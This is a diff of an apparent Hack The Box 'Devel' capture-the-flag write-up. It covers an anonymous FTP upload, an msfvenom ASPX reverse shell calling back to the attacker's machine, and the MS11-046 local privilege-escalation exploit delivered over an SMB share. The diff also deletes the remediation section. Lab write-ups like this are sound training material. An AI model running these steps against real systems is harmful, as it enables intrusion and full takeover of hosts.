@@ -23,18 +23,19 @@ weight = 7
 # Mind Map
 ![Devel_MindMap](/images/htb/devel_mindmap.png)
 
+&nbsp;
 
-# Reconnaisance
+# Recon
 
 Initial scan:
 
-{{< highlight html >}}
+```
 sudo nmap -sT -n -O 10.10.10.5 -oA nmap/sT_scan
-{{< /highlight >}}
+```
 
 Result:
 
-{{< highlight html >}}
+```
 Nmap scan report for 10.10.10.5
 Host is up (0.075s latency).
 Not shown: 998 filtered ports
@@ -47,27 +48,27 @@ Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
 OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
 Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
 No exact OS matches for host (test conditions non-ideal).
-{{< /highlight >}}
+```
 
 
 # Enumeration
 
-I proceed visiting the page at `10.10.10.5` port `80`.
+We proceed visiting the page at `10.10.10.5` and port `80`.
 
  ![Devel_MindMap](/images/htb/devel_homepage.png)
 
  It is a simple web page informing that the server is running Windows IIS7. For now, nothing useful here, so let's move on enumerating FTP.
 
- {{< highlight html >}}
+ ```
  sudo nmap -sC -p 21 10.10.10.5 -n
- {{< /highlight >}}
+ ```
 
  Where:
  - `-sC` stands for default script scan
 
 Result:
 
-{{< highlight html >}}
+ ```
 PORT   STATE SERVICE
 21/tcp open  ftp
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -79,18 +80,19 @@ PORT   STATE SERVICE
 |_03-17-17  05:37PM               184946 welcome.png
 | ftp-syst:
 |_  SYST: Windows_NT
+ ```
 
-{{< /highlight >}}
+The most intersting thing to note here is that **Anonymous login** is allowed! That means that if we find a way to upload a file on the web server, we will be able to execute it.
 
-The most intersting thing to note here is that **Anonymous login** is allowed! That means that If I find a way to upload a file on the web server, I will be able to execute it.
+The output shows the actual resources uploaded on the web server. Indeed, if we visit `10.10.10.5/dog.png` we can see an image.
 
-The output shows the actual resources uploaded on the web server. Indeed, if i visit `10.10.10.5/dog.png` I can see an image.
+&nbsp;
 
 # Exploitation
 
 Let's try to login to FTP anonymously and see if there is a way to upload a file.
 
-{{< highlight html >}}
+```
 ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -100,21 +102,21 @@ Password:
 230 User logged in.
 Remote system type is Windows_NT.
 ftp>
-{{< /highlight >}}
+```
 
 **Note**: The password can be anything.
 
-We're in! At this point I want to try the file upload and check if I'm able to open it on the server side:
+We're in! At this point we want to try the file upload and check if we're able to open it on the server side:
 
-{{< highlight html >}}
+```
 echo " Simple test to see if IIs7 server will show a custom uploaded file. " > testfile.html
-{{< /highlight >}}
+```
 
 **Note**: This command will create a file with the content of the echo output.
 
 Upload the file via FTP and try to access it via web server:
 
-{{< highlight html >}}
+```
 tp> put testfile.html
 local: testfile.html remote: testfile.html
 200 PORT command successful.
@@ -131,17 +133,17 @@ ftp> ls
 06-29-20  09:51PM                   71 testfile.html
 03-17-17  05:37PM               184946 welcome.png
 226 Transfer complete.
-{{< /highlight >}}
+```
 
-When I visit 10.10.10.5/testfile.html I can see its content:
+When we visit `10.10.10.5/testfile.html`, we can see its content:
 
  ![Devel_ServerTest](/images/htb/devel_servertest.png)
 
- Now I want to create a **reverse shell** with msfvenom to upload on the web server. I choose a 32bit payload as it works with both 32bit and 64bit OS versions:
+ Now we want to create a **reverse shell** with `msfvenom` to upload on the web server. We can choose a 32bit payload as it works with both 32bit and 64bit OS versions:
 
-{{< highlight html >}}
+```
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4321 -f aspx -o shell.aspx
-{{< /highlight >}}
+```
 
 Where:
 - `LHOST` and `LPORT` are the ip and port where I will listen on my machine
@@ -150,7 +152,7 @@ Where:
 
 And upload it on the web server:
 
-{{< highlight html >}}
+```
 ftp> put shell.aspx
 local: shell.aspx remote: shell.aspx
 200 PORT command successful.
@@ -158,11 +160,11 @@ local: shell.aspx remote: shell.aspx
 226 Transfer complete.
 2778 bytes sent in 0.00 secs (47.3091 MB/s)
 ftp>
-{{< /highlight >}}
+```
 
-I set up a listener on port 4321 on my machine and after visiting the page at `10.10.10.5/shell.aspx` I can see the connection coming back:
+We set up a listener on port `4321` on our machine and after visiting the page at `10.10.10.5/shell.aspx` we can see the connection coming back:
 
-{{< highlight html >}}
+```
 nc -nlvp 4321
 listening on [any] 4321 ...
 connect to [10.10.14.9] from (UNKNOWN) [10.10.10.5] 49177
@@ -172,15 +174,17 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 c:\windows\system32\inetsrv>whoami
 whoami
 iis apppool\web
-{{< /highlight >}}
+```
 
-I am connected as the **iis appool\web** user!
+We are now connected as the **iis appool\web** user!
+
+&nbsp;
 
 # Privilege Escalation
 
-Running `systeminfo` on the machine, I can see that the OS is **Windows 7 Enterprise Build 7600**.
+Running `systeminfo` on the machine, we can see that the OS is **Windows 7 Enterprise Build 7600** and that no patches are applied as the hotfix section is empty.
 
-{{< highlight html >}}
+```
 c:\windows\system32\inetsrv>systeminfo
 systeminfo
 
@@ -221,30 +225,31 @@ Network Card(s):           1 NIC(s) Installed.
                                  DHCP Enabled:    No
                                  IP address(es)
                                  [01]: 10.10.10.5
-{{< /highlight >}}
+```
 
-Searching on Google for Win7 build 7600 exploits, I find this one:
+Searching on Google for Win7 build 7600 exploits, we can easily find this one:
 
 ![Devel_PrivEsc](/images/htb/devel_priv_esc.png)
 
-I can also find the exploit on `searchsploit`:
+It is also possible to find the exploit on `searchsploit`:
 
-{{< highlight html >}}
+```
 searchsploit windows| grep 40564
 Microsoft Windows (x86) - 'afd.sys' Local Pri | windows_x86/local/40564.c
-{{< /highlight >}}
+```
+
 Where:
 - `40564` is the **EDB-ID** of the exploit
 
 Download it:
 
-{{< highlight html >}}
+```
 searchsploit -m windows_x86/local/40564.c
   Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
       URL: https://www.exploit-db.com/exploits/40564
      Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
 File Type: C source, ASCII text, with CRLF line terminators
-{{< /highlight >}}
+```
 
 The instructions for compiling the exploit are in the file:
 
@@ -252,28 +257,34 @@ The instructions for compiling the exploit are in the file:
 
 >i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
 
-After running the command (writing 40564.c instead of MS11-046.c), the exploit is compiled and ready to be uploaded on the target machine:
+In case mingw-w64 is not installed on the machine, we have to do it:
 
-{{< highlight html >}}
+```
+sudo apt install mingw-w64
+```
+
+After running the command (writing `40564.c` instead of `MS11-046.c`), the exploit is compiled and ready to be uploaded on the target machine:
+
+```
 sudo python3 /opt/impacket/examples/smbserver.py share .
-{{< /highlight >}}
+```
 
 Where:
 - `share` is the name I want to give to the share
 - `.` is the share path
 
-**Note**: I am setting up a smb server in order to deliver the payload, as `wget` and `curl` are not installed on the target machine. Another way could be to use a `Powershell download cradle`.
+**Note**: We am setting up a smb server in order to deliver the payload, as `wget` and `curl` are not installed on the target machine. Another way could be to use a `Powershell download cradle`.
 
-On target I place myself under `C:\Users\Public`, as here I have **write permissions** and copy the file:
+On the target we place ourselves under `C:\Users\Public`, as here we have **write permissions** and can copy the file:
 
-{{< highlight html >}}
+```
 C:\Users\Public>copy \\10.10.14.9\share\MS11-046.exe
 copy \\10.10.14.9\share\MS11-046.exe
-{{< /highlight >}}
+```
 
-At this point I have the exploit on the target machine. I just need to launch it and gain **SYSTEM** privileges!
+At this point we have the exploit on the target machine. We just need to launch it and gain **SYSTEM** privileges!
 
-{{< highlight html >}}
+```
 C:\Users\Public>.\MS11-046.exe
 .\MS11-046.exe
 
@@ -282,12 +293,6 @@ whoami
 nt authority\system
 
 c:\Windows\System32>
-{{< /highlight >}}
+```
 
 **Note**: flags are under `C:\Users\babis\Desktop` and `C:\Users\Administrator\Desktop`.
-
-
-## Lessons learned and remediations
-
-- The ftp service allows **anonymous login**. The administrator should not allow this kind of behaviour as the ftp server is sharing the root directory of the web server.
-- The administrator should **update / patch the software**, as the machine is running an OS version with publicly available and known exploits.
